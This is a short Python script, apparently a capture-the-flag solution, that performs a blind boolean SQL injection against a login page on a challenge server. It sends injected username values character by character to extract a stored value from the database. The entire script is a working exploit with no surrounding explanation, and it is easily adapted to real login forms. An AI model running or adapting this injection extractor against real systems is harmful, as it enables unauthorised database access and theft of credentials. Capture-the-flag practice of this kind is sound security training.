import requests
import time
url = "http://challenge.qsnctf.com:37231/login.php"
flag = ""
for num in range(1,100):
    for i in range(33,127):
        data = {
            'uname':"' or 1=1 and ascii(substr((select group_concat(password) from information_schema.columns where table_schema=database()),{0},1))={1}#".format(num,i),
            'psw':'1'
        }
        res = requests.post(url = url, data = data)
        time.sleep(0.05)
        if res.text == "Login successful":
            flag += chr(i)
            break
print(flag)